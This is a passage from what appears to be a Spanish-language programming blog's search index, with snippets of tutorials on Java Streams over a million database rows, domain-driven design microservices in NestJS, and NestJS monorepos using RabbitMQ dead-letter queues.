"2023-01-30 12:32:00 -0300", "snippet": "Trabajando con 1 millón de registros con Java StreamCuando trabajamos con grandes cantidades de datos lo primero que hacemos es definir un filtrado de la fuente de datos para poder trabajar con lo que realmente nos interesa, pero cuando el filtrado no basta y nuestro universo de datos resultante es considerable en Java podemos hacer uso de su API Streams.Java streams nos proporciona una manera eficiente de recorrer y realizar operaciones sobre una secuencia de elementos.Para demostrar las bondades y la facilidad de uso de esta API montaremos un pequeño ejemplo donde trabajaremos con un universo de 1 millón de registros rescatados de una base de datos.Streams vs ArraysJava Stream nos trae el concepto de flujo de datos donde cada valor del stream es obtenido de forma secuencial con la posibilidad de realizar operaciones individuales sobre cada elemento, sobre un subconjunto de ellos,o sobre la totalidad de los mismos. Estas operaciones pueden ser ejecutadas de forma secuencial o paralela. Este enfoque promueve la programación funcional y la posibilidad de encadenamiento de estas operaciones a modo de pipelines.Diferencia entre Streams y Arreglos: No son almacenes ni estructura de datos. Los valores son obtenidos desde una fuente y pasan a través de una cadena de operaciones. Están orientados a la programación funcional. No modifican la fuente de la que se obtienen datos. No realizan side effects. Promueven la inicialización y evaluación perezosa (lazy) e implementan sus operaciones de forma perezosa cuando sea posible. Un elemento es visitado solo una vez. No tienen un tamaño fijo. Un stream puede alimentarse de una fuente de datos infinita.Programación imperativa vs FuncionalLa capacidad de utilizar programación funcional nos da la posibilidad de crear código más legible y mantenible cuando las lógicas de negocio van cambiando y el volumen de datos empieza a ser un problema y necesitamos agregar nuevas operaciones.Un pequeño ejemplo de programación imperativa es este:List&lt;Integer&gt; ages = Arrays.asList(25, 30, 45, 28, 32);var totalAges = 0;for(int age: ages) { totalAges += age;}System.out.println(totalAges);Y el enfoque funcional es el siguiente:List&lt;Integer&gt; ages = Arrays.asList(25, 30, 45, 28, 32);int computedAges = ages .stream() .reduce(0, (a, b) -&gt; a + b, Integer::sum);System.out.println(computedAges);Ambos códigos hacen lo mismo, pero no se comportarán de igual manera cuando la cantidad de registros sea más grande y aumenten los requerimientos de lógicas de negocio. El rendimiento también será comprometido intentaremos evitar realizar más bucles de los necesarios sobre nuestros registros, pero esto hará el código menos legible. Con Streams nuestros registros serán recorridos de forma secuencial nuestras operaciones podrán ser encadenadas y cada una de ellas tendrá su responsabilidad definida mejorando el testing y la posibilidad de reutilización.Basta de explicaciones esto lo veremos con código y sus correspondientes hacks 😉, a sí que manos a la obra.Levantando 1 millón de datosPuedes descargar este repositorio y ver en detalle el código y si quieres realizar las pruebas a tu gusto, Ahora levantamos nuestra base de datos haciendo uso del script product.sql el que contiene nuestro universo.#!/bin/bashunzip database.zipdocker run --name streamdata -e POSTGRES_USER=streamdata -e POSTGRES_PASSWORD=streamdata -e POSTGRES_DATABASE=streamdata -p 5432:5432 -v \"$PWD/product.sql:/docker-entrypoint-initdb.d/product.sql\" -d postgresArquitectura de softwareNuestro proyecto implementa una arquitectura hexagonal para un mejor entendimiento de nuestros componentes. Además hacemos uso de spring-boot.Capa de dominionuestro dominio es simple:Entidad: Product@Getter@Builder@ToStringpublic class Product { private Integer sku; private String name; private Double price; private Integer stock; private String department; private String brand;}Puerto: ProductRepositorypublic interface ProductRepository { List&lt;Product&gt; findByPaginated(int limit, int offset);}Nuestro repositorio tiene un único método que se encarga de leer los productos de forma paginada este enfoque nos permitirá crear un Stream de Products de forma eficiente sin tener que leer toda la tabla.Capa de InfraestructuraNuestra base de datos empleada es postgres la configuración de las credenciales está dada en el archivo application.ymlspring.jpa: database: POSTGRESQL hibernate: ddl-auto: none show-sql: falsespring.datasource: platform: postgres driverClassName: org.postgresql.Driver url: jdbc:postgresql://localhost:5432/streamdata username: streamdata password: streamdataLa definición de nuestra entidad y repositorio JPA son las siguientes:@Getter@Setter@ToString@Entity@Table(name = \"product\")public class ProductEntity { @Id @Column(name = \"sku\") private Integer sku; @Column(name = \"name\") private String name; @Column(name = \"price\") private Double price; @Column(name = \"stock\") private Integer stock; @Column(name = \"department\") private String department; @Column(name = \"brand\") private String brand;}public interface JpaProductRepository extends JpaRepository&lt;ProductEntity, Integer&gt; { @Query(value=\"SELECT * FROM product p ORDER BY p.sku LIMIT :limit OFFSET :offset \", nativeQuery = true) List&lt;ProductEntity&gt; findByPaginated(@Param(\"limit\")int limit, @Param(\"offset\") int offset);}Para integrar la persistencia con el dominio implementamos nuestro adaptador ProductRepositoryAdapter@Repositorypublic class ProductRepositoryAdapter implements ProductRepository { @Autowired private JpaProductRepository repository; @Override public List&lt;Product&gt; findByPaginated(int limit, int offset) { return repository.findByPaginated(limit, offset) .stream() .map(this::mapToProduct) .toList(); } private Product mapToProduct(ProductEntity entity) { return Product.builder() .sku(entity.getSku()) .stock(entity.getStock()) .brand(entity.getBrand()) .department(entity.getDepartment()) .name(entity.getName()) .price(entity.getPrice()) .build(); }}Nuestra primera aproximación con Streams nos la da el llamado al método findByPaginated() el cual devuelve un Array que nos proporciona el método stream() el cual transforma nuestro objeto Array a Stream lo primero que hacemos es hacer llamado al método map() en el cual recibiremos uns Entidad ORM y devolveremos una Entidad de dominio.Generación de Stream de productosPaginado infinitoAhora teniendo la base de nuestro proyecto podremos hacer uso de Stream para una proceso de alto rendimiento. Lo que haremos será leer nuestra tabla product y obtener su universo completo (1 millón de registros) lo haremos eficientemente seleccionando los datos en Arrays de 10.000 registros e iremos transformando la lista obtenida en un stream de datos.Para leer nuestra tabla lo que haremos es ir leyendo los registros basados en limit y offset para lograr esto crearemos un Stream infinito que nos devuelva la siguiente secuencia: limit=10000 , offset=0 limit=10000 , offset=10000 limit=10000 , offset=20000 limit=10000 , offset=30000 … limit=10000, offset= …NNuestro Stream generador será la siguiente clase:@Getter@ToString@AllArgsConstructorpublic class StreamPaginated { private int limit; private int offset; public static Stream&lt;StreamPaginated&gt; paginate(int size) { return IntStream .iterate(0, i -&gt; i + size) .map(skip -&gt; new StreamPaginated(size, skip)); }}Definición de nuestro Servicio de DominioEste código generará en base a un tamaño dado nuestro stream nos ayudamos de IntStream una clase que nos ayuda a generar Streams de Integers que generará una secuencia de 10.000 en 10.000. Finalmente llamamos a map() para transformar nuestra secuencia de enteros en un objeto StreamPaginated.Ahora creamos nuestro servicio de dominio y utilizamos nuestro StreamPaginated para crear una secuencia infinita de este objeto.@Service@AllArgsConstructorpublic class ProductService { @Autowired private ProductRepository repository; @Transactional public Stream&lt;Product&gt; getStream() { return StreamPaginated .paginate(10000) .map(page -&gt; this.repository.findByPaginated(page.getLimit(), page.getOffset())) .takeWhile(records -&gt; !records.isEmpty()) .flatMap(Collection::stream); }}Ahora la lógica de nuestro Stream se divide en lo siguiente: .paginated(10000): creamos un paginado de 10.000 en 10.000 de forma infinita para obtener todos los registros de nuestra tabla productos. Con esto nos aseguramos de leer todos los registros. .map(page -&gt; this.repository.findByPaginated(page.getLimit(), page.getOffset()))): nuestro paginado lo transformaremos en un Array de Product haciendo llamado a nuestro repositorio y su método de búsqueda de productos. .takeWhile(records -&gt; !records.isEmpty()): Acá está la magia que detendrá nuestra secuencia de paginado, Consumiremos nuestro Stream Mientras los registros que obtengamos no estén vacíos. Es decir cuando venga un Array vacío el Stream terminará. .flatMap(Collection::stream): Aplanaremos nuestro Array de Productos de una lista de productos a una secuencia de productos con esto nuestro quién haga llamado del método getStream() obtendrá los registros de 1 en 1 no importando que estemos obteniendo los datos de 10.000 en 10.000.En resumen el flujo generado realizo las siguientes cambios:# StreamPaginated -&gt; List&lt;Product&gt; -&gt; Stream&lt;Product&gt;Nuestro Stream de product está listo para poder ser consumido y realizar las operaciones que queramos.Definición de Nuestros casos de usoAhora crearemos el siguiente servicio que representará nuestros casos de uso@Servicepublic class ProductUseCases { @Autowired private ProductService products; // ... Your imagination making code}Crearemos casos de uso para realizar operaciones sobre nuestro StreamObtener las marcas de nuestros productospublic List&lt;String&gt; getBrands() { return products.getStream() .map(Product::getBrand) // seleccionamos solo el campo brand de nuestro objeto Product .distinct() // de las marcas obtenidas obtneemos los objetos únicos .toList(); // transformamos nuestro Stream&lt;String&gt; a List&lt;String&gt; }productos sin stockpublic Stream&lt;Product&gt; getSkuWithoutStock() { return this.products.getStream() .filter(product -&gt; product.getStock() &lt;= 0); // filtraremos todos los productos con stock igual o menor a zero }conteo de productos sin stockpublic long countSkuWithoutStock() { return this.products.getStream() .filter(product -&gt; product.getStock() &lt;= 0) // filtraremos todos los productos con stock igual o menor a zero .count(); // de los productos filtrados realizaremos un conteo y devolveremos el valor numerico }Suma de Stock del departamento 604public long sumStockDepartment604() { return this.products.getStream() .filter(product -&gt; product.getDepartment().equals(\"604\")) // filtramos productos del depto 604 .map(Product::getStock) // mapeamos de Product a Integer .reduce(0, Integer::sum) // realizamos una suma con el tradicional reduce() .longValue(); // devolvemos el valor como un long }Agrupar por marca productos del departamento 604public Map&lt;String, List&lt;Product&gt;&gt; groupByDepartment604Brand() { return this.products.getStream() .filter(product -&gt; product.getDepartment().equals(\"604\")) // filtramos productos del depto 604 .collect(Collectors.groupingBy(p -&gt; p.getBrand() != null ? p.getBrand() : \"No brand\")); // agrupamos por marca si el campo marca es nulo le damos el valor por defecto \"No brand\" }Esta es la magia de Stream poder realizar operaciones sobre una gran cantidad de datos de forma eficiente, ya que estamos obteniendo valoresde forma secuencial sin necesidad de obtener el universo completo y después realizar operaciones. Basado en programación funcional nos hace más fácil crear código más legible claro que esto es con operaciones más comunes lamentablemente hay ocasiones donde el código es más difícil de entender por la nomenclatura de los genéricos de Java, pero ahi solo queda dividir y vencer.Para probar por ti mismo realiza las pruebas en la clase src/main/java/App.java:@Log4j2@Component@SpringBootApplicationpublic class App { @Autowired private ProductUseCases productUseCases; public static void main(String[] args) { SpringApplication.run(App.class, args); } @EventListener(ApplicationReadyEvent.class) public void onReady() { productUseCases .getSkuWithoutStock() .forEach(product -&gt; log.info(\"Product {}\", product)); }}ConclusionesNo hay conclusiones prueba por ti mismo el verdadero poder de API Stream de JavaGithub repository" }, { "title": "Diseñando Microservicios con Domain Driven Design y NestJS", "url": "/posts/disenando-microservicios-con-ddd/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript, Domain Driven Design, DDD", "tags": "typescript, NestJs, hexagonal, microservices, ddd", "date": "2023-01-10 12:32:00 -0300", "snippet": "Domain Driven Design o DDD para los amigos es un enfoque de diseño donde las reglas y modelo de negocio son el corazón de la aplicación. Nos olvidamos de diseños técnicos y nos centramos más en casos de uso y el modelo de contextos asociados a la problemática a resolver. DDD es ideal para proyectos complejos tanto en software como de arquitectura. Dicho esto veremos el poder de DDD en una arquitectura orientada a microservicios.La arquitectura de microservicios no solo se trata de tomar una aplicación enorme como un monolito y dividirla en partes o módulos pequeños independientes en tecnología y lenguaje para poder obtener una independencia de funcionalidades. Esto conlleva grandes desafíos como la comunicación entre los diversos componentes, cada microservicio es independiente, pero contribuye a una misma causa, la que es integrar un sistema más grande donde este tiene un propósito que cumplir.Definiendo microservicios basados en DDDCuando modelamos un sistema con DDD dividimos nuestra problemática en Bounded Contexts (límites de contexto), estos son los que marcan los límites de una funcionalidad en nuestra aplicación y define que importancia, comportamiento responsabilidad tendrán los componentes que conformen este Bounded Context. Cada contexto es independiente y la comunicación entre estos puede darse mediante eventos de dominio. Sus componentes, aunque compartan ciertas propiedades con los de otros contextos, son totalmente diferentes, ya que tienen su responsabilidad definida por el negocio. Esta característica de diseño sobre el dominio que posee DDD nos da la ventaja de definir las tecnologías adecuadas para cada contexto. Con esto la implementación de nuestros microservicios estará guiada por el dominio y cada microservicio representará una problemática específica resolver del sistemaEl contexto define la intención y su responsabilidadEl contexto nos dice muchoLa importancia del contexto en nuestros modelos es enorme. En aplicaciones tradicionales es típico modelar casos de negocio donde una tabla en base de datos representa distintos contextos dependiendo del caso. Por ejemplo, la tabla producto en una aplicación de ventas tiene su objetivo, pero en un contexto de bodega tiene otro y cada caso de uso diferente le dará más prioridad a ciertas propiedades sobre otras de la tabla. Cuando el sistema escale los requerimientos serán distintos y podemos también tener el problema que un cambio necesario para un contexto determinado como el de bodega afecte el contexto de ventas, esto repercute negativamente al momento de modelar nuestras lógicas de negocio, es por este motivo que una de las premisas de los microservicios es que cada microservicio es dueño de sus datos. Y esto encaja perfecto con la idea de Bounded Context en DDD.Modelando un servicio de viajes tipo UBERPara levantar un stack de microservicios con DDD levantaremos un servicio de viajes tipo Uber donde definiremos unos módulos de ejemplo para poder implementar unos microservicios de ejemplo. Todo esto, ayudados por nuestro framework Gatuno NestJs. El proyecto es una implementación en Mono repositorio donde el sistema completo tendrá los siguientes contextos: enrollment: Registro de conductores y pasajeros tracking: Seguimiento del vehículo el cual podrá emitir alertas de pánico. trips: Agendamiento de viajesEstas 3 características serán nuestros microservicios. Ahora generamos nuestro stack mediante la cli de NestJs lo importante acá es definir la librería domain la que contendrá la lógica del negocio donde incluye los contextos anteriormente descritos.#!/bin/bashnest new microservices-appsnest generate library domain Si quieres aprender de monorepos con NestJs ven por acá muchachoEntonces nuestra librería domain queda la siguiente manera:#!/bin/bash├──  context│ ├──  enrollment│ │ ├──  entity│ │ │ ├──  Account.ts│ │ │ ├──  Driver.ts│ │ │ └──  Rider.ts│ │ ├──  event│ │ │ ├──  AccountCreated.ts│ │ │ ├──  DriverCreated.ts│ │ │ └──  RiderCreated.ts│ │ ├──  port│ │ │ ├──  AccountRepository.ts│ │ │ ├──  DriverRepository.ts│ │ │ └──  RiderRepository.ts│ │ └──  vo│ │ ├──  Capacity.ts│ │ ├──  Color.ts│ │ ├──  Email.ts│ │ ├──  Model.ts│ │ ├──  Vehicule.ts│ │ └──  Year.ts│ ├──  tracking│ │ ├──  entity│ │ │ ├──  Driver.ts│ │ │ ├──  PanicAlert.ts│ │ │ └──  Vehicule.ts│ │ ├──  event│ │ │ ├──  ButtonPanicActivated.ts│ │ │ ├──  ButtonPanicDesactivated.ts│ │ │ └──  GpsPositionUpdated.ts│ │ ├──  port│ │ │ ├──  DriverRepository.ts│ │ │ └──  VehiculeRepository.ts│ │ └──  vo│ │ └──  GpsPosition.ts│ └──  trips│ ├──  entity│ │ ├──  Driver.ts│ │ ├──  Rider.ts│ │ ├──  Trip.ts│ │ └──  Vehicule.ts│ ├──  event│ │ └──  DriverAssigned.ts│ ├──  GpsPosition.ts│ └──  vo│ ├──  MapPoint.ts│ ├──  Pricing.ts│ └──  TripState.ts├──  index.ts└──  shared ├──  domain │ ├──  PersonInfo.ts │ ├──  Plate.ts │ └──  vo ├──  libs │ └──  schemaValidator.ts └──  seedwork ├──  AggregateRoot.ts ├──  DomainEvent.ts ├──  DomainException.ts ├──  Entity.ts ├──  Identifier.ts ├──  port │ └──  DomainEventBus.ts ├──  UniqueEntityID.ts ├──  UseCase.ts └──  ValueObject.tsMientras tanto le echamos una mirada a al módulo de tracking y la entidad Vehiculeexport interface VehiculeState { plate: Plate; driver: Driver; position: GpsPosition; isPanicButtonActive: boolean; panicAlerts: PanicAlert[]}export class Vehicule extends Entity&lt;VehiculeState&gt; { constructor(props: EntityProps&lt;VehiculeState&gt;) { super(props) this.addEvent( new GpsPositionUpdated({ ...this.state.position.getValue() }) ) } updatePosition(position: GpsPosition) { this.state.position = position this.addEvent(new GpsPositionUpdated({ ...position.getValue() })) } activeButtonPanic(position: GpsPosition) { this.state.isPanicButtonActive = true this.state.position = position this.state.panicAlerts.push(new PanicAlert({ position: position, type: 'button-panic-active' })) this.addEvent(new ButtonPanicActivated({ vehiculeID: this.ID, position: position })) } desactiveButtonPanic(position: GpsPosition) { if (!this.state.isPanicButtonActive) { return } this.state.isPanicButtonActive = false this.state.position = position this.state.panicAlerts.push(new PanicAlert({ position: position, type: 'button-panic-desactive' })) this.addEvent(new ButtonPanicDesactivated({ vehiculeID: this.ID, position: position })) } get plate() { return this.state.plate } get position() { return this.state.position } get driver() { return this.state.driver } get isButtonPanicActive() { return this.state.isPanicButtonActive }}Nuestra entidad Vehicule muestra lógica asociada a la ubicación y alertas de pánico, pero si vemos el código de Vehicule en el contexto de enrollment vemos que esta no es una entidad sino un value object que tiene otra responsabilidadexport interface VehiculeProps { plate: Plate; model: Model; color: Color; year: Year; capacity: Capacity;}export class Vehicule extends ValueObject&lt;VehiculeProps&gt; { constructor(props: { licence: string; email: string; firstname: string; lastname: string; phoneNumber: string; plate: string; model: string; color: string; year: string; capacity: number; }){ super({ plate: new Plate(props.plate), capacity: new Capacity(props.capacity), color: new Color(props.color), model: new Model(props.model), year: new Year(props.year) }) } get plate() { return this.props.plate.getValue() } get model() { return this.props.model.getValue() } get color() { return this.props.color.getValue() } get year() { return this.props.year.getValue() } get capacity() { return this.props.year.getValue() }}Con esto podemos aclarar más la idea de contextos y sus límites.Librería application y la definición de los casos de usoNuestra librería domain esta implementada ahora crearemos una nueva librería llamada application.#!/bin/bashnest generate library applicationEsta contendrá los casos de uso de nuestra aplicación esta capa contendrá la definición de los módulos de NestJs por cada contexto de nuestro dominio.Caso de uso enrollmentexport class EnrollmentUseCasesService { constructor( private readonly driver: DriverRepository, private readonly rider: RiderRepository, private readonly account: AccountRepository, private readonly eventbus: DomainEventBus ) {} async createAccount(email: string) { const account = Account.create(email) await this.account.save(account) this.eventbus.dispatch(account.pullEvents()) } async enrollDriver(dto: EnrollDriverDto) { const account = await this.account.findById(dto.accountID) const driver = Driver.create({ ...dto, account }) await this.driver.save(driver) this.eventbus.dispatch(driver.pullEvents()) } async enrollRider(dto: EnrollRiderDto) { const account = await this.account.findById(dto.accountID) const rider = Rider.create({ ...dto, account }) this.rider.save(rider) this.eventbus.dispatch(rider.pullEvents()) }}Caso de uso trackingexport class TrackingUseCasesService { constructor( private readonly vehicule: VehiculeRepository, private readonly eventbus: DomainEventBus ) {} async startTracking(dto: StartTrackingDto) { const driver = Driver.create({ ...dto.driver }) const vehicule = Vehicule.create({ ..dto, vehicule }) await this.vehicule.save(vehicule) this.eventbus.dispatch(vehicule.pullEvents()) } async updateTracking(dto: UpdateTrackingDto) { const vehicule = await this.vehicule.findById(new UniqueEntityID(dto.vehiculeID)) vehicule.updatePosition(new GpsPosition({ ...dto })) await this.vehicule.save(vehicule) this.eventbus.dispatch(vehicule.pullEvents()) } }Integrando el dominio con Nestjs mediante módulos dinámicosLos módulos dinámicos que nos provee NestJs son excelentes para integrar componentes de software totalmente desacoplados.Empezamos definiendo la estructura de las opciones de nuestro módulo, lo haremos con el contexto de tracking, pero la misma lógica se aplica a otros contextos. El parámetro Type es propio de NestJs, Nos ayuda a trabajar con providers y modulesinterface TrackingModuleOptions { modules: Type[] adapters: { vehiculeRepository: Type&lt;VehiculeRepository&gt;; eventbus: Type&lt;DomainEventBus&gt; }}TrackingModuleOptions recibe los siguientes parámetros: modules: módulos NestJs a importar para poder hacer uso de providers externos. adapters: providers que implementan los puertos definidos en nuestro dominio, estos providers deben estar en los módulos registros por le parámetro modules de TrackingModuleOptions.Ahora la interfaz TrackingModuleOptions la integraremos al método register() de nuestro módulo tracking de esta manera nuestro casos de uso podemos inyectarlo como proveedor de NestJS mediante la ayuda e useFactory@Module({})export class TrackingModule { static register(options: TrackingModuleOptions): DynamicModule { const { modules, adapters } = options const { vehiculeRepository, eventbus } = adapters return { module: TrackingModule, imports: [ ...modules, ], exports: [ TrackingUseCasesService, ], providers: [ { provide: TrackingUseCasesService, useFactory(repository: VehiculeRepository, eventbus: DomainEventBus) { return new TrackingUseCasesService(repository, eventbus) }, inject:[ vehiculeRepository, eventbus ] } ] } }}Y ahora crearemos nuestro microservicio tracking-ms#!/bin/bashnest generate app tracking-msnest genrate module corenest genrate module adapternest genrate module http-serverPara poder hacer uso de nuestro módulo solo debemos crear los adaptadores correspondientes al módulo tracking en este caso necesitamos: DomianEventBus: encargado de emitir eventos de dominio en este caso nos integraremos con RabbitMQ con el cual enviaremos nuestro evento de dominio. VehiculeRepository: encargado de la persistencia de vehículos en este caso es una implementación ordinaria en memoria.@Injectable()export class TrackingEventService implements DomainEventBus { constructor(private readonly rabbitmq: RabbitMQClientService) {} async dispatch(events: DomainEvent&lt;any&gt;[]): Promise&lt;void&gt; { events.forEach(event =&gt;this.rabbitmq.emitTo(event.name, event.data)) }}@Injectable()export class VehiculeService implements VehiculeRepository { private vehicules: Map&lt;UniqueEntityID, Vehicule&gt; = new Map() async save(vehicule: Vehicule): Promise&lt;void&gt; { this.vehicules.set(vehicule.ID, vehicule) } async findById(id: UniqueEntityID): Promise&lt;Vehicule&gt; { return this.vehicules.get(id) }}La comunicación entre microservicios mediante eventos de dominioLos eventos de dominio que generaran nuestro contextos serán la forma en que estos se comunicaran entre sí de forma asíncrona para esto podemos implementar un broker de mensajería con RabbitMQ a modo de ejemplo. Para lograr un componente encargado de los eventos reutilizable generaremos un módulo llamdo event-queue de NestJs en la librería shared de nuestro stack. event-queue├──  contants.ts├──  event-queue.module.ts└──  rabbitmq ├──  rabbitmq-message.ts └──  services └──  rabbitmq-client.service.tsY el código cliente de nuestro RabbitMQ:export interface RabbitMQMessage&lt;T&gt; { id: string; pattern: string; timestamp: Date; data: T;}@Injectable()export class EventQueueService { constructor(@Inject(RABBITMQ_CLIENT) private client: ClientProxy) { } emitTo&lt;T&gt;(pattern: string, payload: T): RabbitMQMessage&lt;T&gt; { const message: RabbitMQMessage&lt;T&gt; = { id: uuidv4(), pattern: pattern, timestamp: new Date(), data: payload } this.client.emit(pattern, message) return message }}Registro de módulos en nuestros microserviciosCon nuestros puertos definidos ahora inicializaremos nuestro módulo tracking en el archivo apps/tracking-ms/src/core/core.module.ts haciendo uso de los providers del módulo AdaperModuleconst trackingModule = TrackingModule.register({ modules: [ AdapterModule ], adapters: { vehiculeRepository: VehiculeService, eventbus: TrackingEventService }})@Global()@Module({ imports:[ trackingModule ], exports: [ trackingModule ]})export class CoreModule {}Así ya tenemos nuestro microservicio listo su estructura es la siguiente:├──  core│ │ └──  core.module.ts│ ├──  infraestructure│ │ ├──  adapter│ │ │ ├──  adapter.module.ts│ │ │ └──  services│ │ │ ├──  tracking-event.service.ts│ │ │ └──  vehicule.service.ts│ │ └──  http-server│ │ ├──  controller│ │ │ └──  tracking.controller.ts│ │ ├──  http-server.module.ts│ │ └──  model│ │ ├──  StartTrackingRequest.ts│ │ └──  UpdateTrackingRequest.tsNuestros otros contextos tendrán una implementación casi idéntica, diferirán en los adaptadores y otras propiedades que dependerán del caso.Para iniciar nuestra aplicación ejecutamos lo siguiente:docker run --rm -it --hostname DDD-rabitmq -p 15672:15672 -p 5672:5672 rabbitmq:3-managementnest start -w tracking-msnest start -w enrollment-msnest start -w trips-msConclusionesDiseñamos la base para una arquitectura de microservicios utilizando las bondades de diseño que nos brinda DDD. Este enfoque no solo nos da una mirada más al negocio, sino que se complementa bien en el diseño de software en sistemas complejos y distribuidos si bien DDD puede ser complejo, empezar por utilizar sus conceptos será un buen inicio.Github repositoryFinalizandoPara terminar nos despedimos con el meme de cortesía." }, { "title": "Mono Repositorios con Nestjs Para una Arquitectura Orientada a Eventos", "url": "/posts/mono-repo-with-nestjs/", "categories": "Programacion, Nestjs, Typescript, Events", "tags": "typescript, nestjs, rabbitmq", "date": "2022-12-13 12:32:00 -0300", "snippet": "Definir una arquitectura distribuida puede llegar a ser complejo cuando manejas muchos proyectos o servicios y estos tienen que interactuar entre sí. Cada servicio tendrá su propio repositorio y nos dará la ventaja de usar la tecnología adecuada al problema específico a solucionar, pero cuando tu stack tecnológico comparte el mismo lenguaje o framework podrías pensar en usar Monorepositorios.Monorepo es enfoque de desarrollar múltiples aplicaciones dentro de un solo repositorio. Esto podemos verlo muchas veces en arquitecturas de microservicios centralizando todas las aplicaciones dentro de un mismo proyecto donde podremos reutilizar ciertas piezas de software entre aplicaciones sin necesidad de desplegar librerías asociadas a gestores de dependencias. Si bien esto trae ventajas también trae desafíos al momento de desplegar y de definir una arquitectura escalable y mantenible. Pero como todo enfoque este debe ser evaluado según tu caso y necesidades.Nestjs nos provee una forma fácil de implementar monorepositorios, su mágica e útil cli nos permite transformar nuestro proyecto con una sola aplicación a múltiples aplicaciones y la posibilidad de definir librerías compartidas.Creando un Monorepositorio con NestjsPodemos empezar creando una simple aplicación con NestJs#!/bin/bashnest new main-applicationHemos creado una aplicación llamada main-application nada nuevo donde el código fuente esta situado en el directorio src, Pero esta estructura de proyecto puede ser transformada a monorepositorio simplemente agregando una nueva aplicación ingresamos dentro del raíz del proyecto y ejecutamos:#!/bin/bashnest generate app other-applicationNuestra aplicación cambio su estructura, Se creo un nuevo directorio en la raíz del proyecto llamado apps dentro del cual se ubicaran las aplicaciones. Nuestra carpeta src es movida a main-application. apps├──  main-application│ ├──  src│ │ ├──  main.ts│ │ ├──  producer.controller.spec.ts│ │ ├──  producer.controller.ts│ │ ├──  producer.module.ts│ │ └──  producer.service.ts│ ├──  test│ │ ├──  app.e2e-spec.ts│ │ └──  jest-e2e.json│ └──  tsconfig.app.json└──  other-application ├──  src │ ├──  app.controller.spec.ts │ ├──  app.controller.ts │ ├──  app.module.ts │ ├──  app.service.ts │ └──  main.ts ├──  test │ ├──  app.e2e-spec.ts │ └──  jest-e2e.json └──  tsconfig.app.jsonAhora también podemos crear librerías donde podremos compartir código entre aplicaciones.#!/bin/bashnest generate library sharedEsto creará un directorio en la raíz del proyecto llamado libs.#!/bin/bash libs└──  shared ├──  src │ ├──  index.ts │ ├──  shared.module.ts │ ├──  shared.service.spec.ts │ └──  shared.service.ts └──  tsconfig.lib.jsonEsto es todo, ya podemos trabajar con monorepositorios dentro de NestJs.Arquitectura orientada a eventos utilizando MonorepositorioPara ver las ventajas que nos dará los monorepositorios implementaremos una arquitectura orientada a eventos utilizando RabbitMQ con una cola de mensajes y una dead-letter para mensajes fallidos, todo esto mediante la utilización de un custom módulo con NestJs definido como una librería compartida.¿Qué es RabbitMQ?RabbitMQ es un broker de mensajería de código abierto, distribuido y escalable, que sirve como intermediario para la comunicación eficiente entre productores y consumidores.RabbitMQ implementa el protocolo mensajería de capa de aplicación AMQP (Advanced Message Queueing Protocol), el cual está enfocado en la comunicación de mensajes asíncronos con garantía de entrega, a través de confirmaciones de recepción de mensajes desde el broker al productor y desde los consumidores al broker.¿Qué es una Dead letter?Una Dead Letter es una cola donde los mensajes que no pudieron ser procesados por los consumidores llegan, con esto podemos generar una estrategia de reintento o de registro de que el mensaje no pudo ser procesado.En el siguiente repositorio tendremos un stack tecnológico que implementa una arquitectura orientada a eventos con la cual podemos implementar el envío, consumo y reintento de mensajes asíncronos mediante un servidor RabbitMQ. Este proyecto es ideal para generar una estrategia de dead-letter-queue para la recuperación de operaciones fallidas siguiendo la arquitectura modular de nestjs y sus buenas prácticas.Módulo Rabbitmq-queueEste módulo fue diseñado con el paquete @nestjs/microservices de Nestjs y contiene las siguientes características: Consumer de Mensajes: Factory de creación de microservicio Worker Dead Letter Consumer de mensajes no procesados por error en el consumer: Factory de creación de microservicio Recovery Cliente Productor de mensajes: Servicio Nesjs Injectable importando RabbitmqModuleNuestro módulo puede ser importado y utilizado por las aplicaciones que definamos en el directorio apps/ y desde cualquier librería o módulo compartido que definamos en libs/Este proyecto requiere Node 14 o superior. instala sus dependencias y empezaremos a definir una estructura básica de prodctor, consumidor y control de errores#!/bin/bashnpm installLevantando un servidor RabbitMQDebes tener instalado docker y ejecutar la siguiente instrucción:#!/bin/bashdocker run --rm -it --hostname rabbit-server -e RABBITMQ_DEFAULT_VHOST=mono-repo-example -p 15672:15672 -p 5672:5672 rabbitmq:3-managementStack de AplicacionesPara configurar las aplicaciones que estarán en la misma cola RabbitMQ escuchando los eventos introduciré 3 conceptos: Producer: aplicación encargada de enviar mensajes a una cola Worker: aplicación encargada de realizar una tarea especifica dependiendo del mensjae. Será quien consuma los mensajes de una cola Recovery: “Dead Letter Queue” aplicación encargada de consumir mensajes que no pudieron ser procesados por algún error en la aplicación WorkerEstas 3 aplicaciones deben compartir una configuración en comúm para que puedan funcionar en conjunto. Y esta es definida por la interface RabbitmqQueueModuleOptionsEjemplo de configuración Base:const options: RabbitmqQueueModuleOptions = { credentials: { host: 'localhost', password: 'guest', port: 5672, vhost: 'mono-repo-example', user: 'guest' }, queue: { name: 'my-queue', deadLetter: { exchange: 'dlx', patterns: ['SEND_MESSAGE'] // dead-letter for specific message pattern } } }También deben compartir la estructura del mensaje que serán enviados a RabbitMQ. Esta estructura puede ser definida de acuerdo a tus necesidades.Ejemplo de una estructura de mensajeinterface Data { name: string message: string}Ya definida nuestra configuración y estructura de mensaje, Podemos empezar a levantar nuestras aplicacionesIniciar WorkerPara iniciar una aplicaión Worker debes ir a tu proyecto Nestjs en este caso sería apps/worker y en el archivo apps/worker/main.ts debes invocar la función createWorkerMicroserviceOptions el cual devolverá un objeto ClientProviderOptions el cual es necesario para iniciar un microservicio de NestjsEjemplo main.tsasync function bootstrap() { const options = { credentials: { host: 'localhost', password: 'guest', port: 5672, vhost: 'javel', user: 'guest' }, queue: { name: 'my-queue', deadLetter: { exchange: 'dlx', patterns: ['SEND_MESSAGE'] } } } // Build ClientProviderOptions for Worker Microservice const workerMicroservice = await RabbitmqQueueModule.createWorkerMicroserviceOptions(options) // Init Microservice const app = await NestFactory.createMicroservice(WorkerModule, workerMicroservice); await app.listen()}bootstrap();Definir Worker controller para obtener mensajes.Ahora para definir los controladores que consumirán los mensajes es de igual forma, manera que nos indica la documentación de Nestjs. El valor de MessagePattern debe coincidir con las configuraciones base si se necesita usar una Dead letter desde la App Recovery.@Controller('consumer')export class ConsumerController { @EventPattern('SEND_MESSAGE', Transport.RMQ) consume(@Payload() data: RabbitmqMessage&lt;Data&gt;, @Ctx() context: RmqContext) { try { // Make some operations with message context.getChannelRef().ack(context.getMessage()) } catch (error) { Logger.warn(`An error occured with mnessage: ${data.id}`); // reject message and set reque = false // this will dead letter our message context.getChannelRef().reject(context.getMessage(), false); } }}Nuestro controlador debe recibir el 